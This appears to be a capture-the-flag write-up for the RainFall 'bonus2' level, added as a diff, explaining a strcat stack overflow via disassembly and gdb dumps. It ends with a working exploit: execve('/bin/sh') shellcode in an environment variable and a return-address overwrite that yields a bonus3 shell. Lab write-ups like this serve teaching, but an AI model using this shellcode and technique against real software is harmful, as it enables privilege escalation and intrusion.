@@ -1,0 +1,83 @@
+This program makes a call to strcat that is vulnerable to a buffer overflow.
+
+The program expects argc to be equal to 3 :
+
+	0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)
+	0x0804853c <+19>:	je     0x8048548 <main+31>
+	0x0804853e <+21>:	mov    $0x1,%eax
+	0x08048543 <+26>:	jmp    0x8048630 <main+263>
+
+Then two calls to strncpy copy the contents of argv[1] and argv[2] into a buffer
+located at 0x50(%esp) :
+
+	0x0804855c <+51>:	mov    0xc(%ebp),%eax
+	0x0804855f <+54>:	add    $0x4,%eax
+	0x08048562 <+57>:	mov    (%eax),%eax
+	0x08048564 <+59>:	movl   $0x28,0x8(%esp)
+	0x0804856c <+67>:	mov    %eax,0x4(%esp)
+	0x08048570 <+71>:	lea    0x50(%esp),%eax
+	0x08048574 <+75>:	mov    %eax,(%esp)
+	0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
+
+		strncpy(buf, argv[1], 0x28);
+
+	0x0804857c <+83>:	mov    0xc(%ebp),%eax
+	0x0804857f <+86>:	add    $0x8,%eax
+	0x08048582 <+89>:	mov    (%eax),%eax
+	0x08048584 <+91>:	movl   $0x20,0x8(%esp)
+	0x0804858c <+99>:	mov    %eax,0x4(%esp)
+	0x08048590 <+103>:	lea    0x50(%esp),%eax
+	0x08048594 <+107>:	add    $0x28,%eax
+	0x08048597 <+110>:	mov    %eax,(%esp)
+	0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
+
+		strncpy(buf + 0x28, argv[2], 0x20);
+	
+Whatever the size of that buffer is, it is not possible to copy more than 72
+bytes in it.
+
+The program allows the user to retrieve the value of the environment variable
+LANG and sets a global variable according to its value.
+This value is then used to initialize a buffer in a subroutine with 3 potential
+strings : "Hello ", "Hyvää päivää " or "Goedemiddag! "
+(see source code for more details).
+For the exploit to work it is necessary to set the LANG environment variable to
+either fi or nl.
+Here I used LANG=fi. The special characters use two bytes for encoding instead
+of 1.
+
+Fast forward to the interesting part, here is the state of the stack right
+before the call to strcat in the subroutine greetuser :
+
+	(gdb) x/30wx $esp
+	0xbffff4e0:	0xbffff4f0	0xbffff540	0x00000001	0x00000000
+	0xbffff4f0:	[0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
+				"Hyv..." ä = '\xc3\xa4'
+	0xbffff500:	0xbf0020a4	0xb7e338f8	0x00000002	0xb7ec38ee
+					 ' ' = '\x20'
+	0xbffff510:	0xbffff548	0xbffff590	0x00000000	0xbffff5dc
+	0xbffff520:	0xbffff5f8	0xb7ff26b0	0xbfffff01	0xb7f5d780
+	0xbffff530:	0xbfffff04]	0xb7fff918	0xbffff5f8 0x08048630
+		[] local buf in greetuser()
+	0xbffff540:	0x41414141	0x41414141	0x41414141	0x41414141
+	0xbffff550:	0x41414141	0x41414141
+
+We can see that the greeting message is null terminated at 0xbffff503.
+
+There is no bound check on the call to strcat, and since the buffer is too small
+to receive the longer greeting messages plus the 72 cumulative bytes of argv[1]
+and argv[2], here is the return address on the stack after the call to strcat :
+
+	(gdb) x/wx $ebp + 4
+	0xbffff53c:	0x42424242
+
+Putting everything together, we have :
+
+bonus2@Rainfall:~$ export LANG=fi
+bonus2@Rainfall:~$ export SHELLCODE=`python -c "print '\x90' * 150 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+
+bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A' * 40") $(python -c "import struct; print 'B' * 18 + struct.pack('I', `/tmp/get_addr`)")
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB<���
+$ whoami
+bonus3
+$
